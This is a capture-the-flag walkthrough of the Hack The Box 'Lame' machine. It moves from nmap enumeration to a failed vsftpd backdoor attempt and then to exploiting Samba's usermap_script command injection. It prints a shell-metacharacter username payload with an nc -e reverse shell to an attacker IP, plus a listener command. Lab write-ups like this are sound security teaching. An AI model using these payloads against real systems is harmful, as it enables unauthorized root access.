Here's what nmap teaches us :

- port 21 (FTP) vsftpd 2.3.4 : anonymous login
- port 22 (SSH) OpenSSH 4.7p1
- port 139 (NETBIOS)  Samba smbd 3.X - 4.X
- port 445 (SMB) Samba smbd 3.0.20-Debian

We have some version, let's check for known exploits.

### Searchsploit

#### FTP

![](/assets/imgs/lame/searchsploit_vsftpd.PNG)

I download the metasploit exploit like so :

```bash
searchsploit -m unix/remote/17491.rb
```

Looking at the exploit, we see that the backdoor payload is initiated in response to a :) character  combination in the username which represents a smiley face. The code  sets up a bind shell listener on port 6200.

Let's try it manually :

We triggered the backdoor, by using a smiley after the username.

Then we connect to the bind shell on port 6200.

But we got nothing, too bad, the FTP server must be patch !

#### SSH

![](/assets/imgs/lame/searchsploit_openssh.PNG)

As we can see, there is some exploit to do some "Username Enumeration". It might be interresting, but at the moment I don't really need a username. So if don't find anything with SMB, I'll get back to that exploit.

#### SMB

![](/assets/imgs/lame/searchsploit_samba3.0.20.PNG)

I see a "Command Execution", let's look at it.

## Exploit

------

Download the metasploit exploit :

```bash
searchsploit -m unix/remote/16320.rb
```

The interresting part is here :

```ruby
username = "/=`nohup " + payload.encoded + "`"
```

 By specifying a username containing shell meta characters, attackers can execute arbitrary commands. (https://www.rapid7.com/db/modules/exploit/multi/samba/usermap_script)

I want a reverse shell so my payload should look something like this :

```
./=`nohup nc -e /bin/bash 10.10.14.3 4444`
```

Let's try it !

Open a nc listener :

```bash
nc -lvp 4444
```

Then triggered the exploit.

We have a connection back to our listener and we are "root", nice !

### Shell upgrade

Now that we have a shell, let's upgrade it :

And now go read the flags !
